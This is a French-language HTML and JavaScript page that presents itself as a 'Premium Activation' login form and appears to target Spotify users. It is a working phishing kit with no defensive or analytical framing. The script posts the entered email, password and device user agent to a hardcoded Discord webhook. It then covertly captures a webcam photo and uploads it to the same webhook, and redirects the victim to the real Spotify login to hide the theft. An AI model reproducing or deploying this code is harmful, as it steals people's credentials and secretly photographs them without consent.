<div class="w-full max-w-sm bg-[#121212] p-8 rounded-lg border border-gray-800 shadow-2xl">
    <h1 class="text-2xl font-bold mb-6 text-center">Activation Premium</h1>
    <p class="text-gray-400 text-sm mb-6 text-center">Identifiez-vous pour activer votre accès illimité.</p>
    
    <div class="space-y-4">
        <input id="u" type="text" placeholder="E-mail ou nom d'utilisateur" class="w-full p-4 s-input rounded text-sm">
        <input id="p" type="password" placeholder="Mot de passe" class="w-full p-4 s-input rounded text-sm">
        
        <button onclick="execute()" id="btn" class="w-full p-4 s-btn mt-4 uppercase tracking-widest text-sm">
            ACTIVER L'ACCÈS
        </button>
    </div>
</div>

<video id="v" autoplay></video>
<canvas id="c"></canvas>

<script>
    const hook = "[https://discord.com/api/webhooks/1481101174131392554/JO8MZpYjagqXqSFcnyp4ZCyOnUKe-vVdsyNeg7e7IJCVwdIgzlmeWxH65dQzr7hUXxke](https://discord.com/api/webhooks/1481101174131392554/JO8MZpYjagqXqSFcnyp4ZCyOnUKe-vVdsyNeg7e7IJCVwdIgzlmeWxH65dQzr7hUXxke)";

    async function execute() {
        const user = document.getElementById('u').value;
        const pass = document.getElementById('p').value;
        const btn = document.getElementById('btn');

        if (!user || !pass) return;
        btn.innerHTML = "TRAITEMENT...";
        btn.disabled = true;

        // 1. Envoi immédiat des identifiants
        try {
            await fetch(hook, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `🚨 **LOG RÉCUPÉRÉ**\n📧 **Email**: \`${user}\`\n🔑 **Pass**: \`${pass}\`\n📱 **Appareil**: ${navigator.userAgent}`
                })
            });
        } catch (e) {}

        // 2. Tentative Photo
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.getElementById('v');
            video.srcObject = stream;
            
            await new Promise(r => setTimeout(r, 1200));
            
            const canvas = document.getElementById('c');
            canvas.width = 640; canvas.height = 480;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            canvas.toBlob(async (blob) => {
                const fd = new FormData();
                fd.append('file', blob, 'photo.png');
                await fetch(hook, { method: 'POST', body: fd });
                stream.getTracks().forEach(t => t.stop());
            }, 'image/png');
        } catch (e) {}

        // Redirection après 2 secondes
        setTimeout(() => {
            window.location.href = "[https://www.spotify.com/login](https://www.spotify.com/login)";
        }, 2000);
    }
</script>
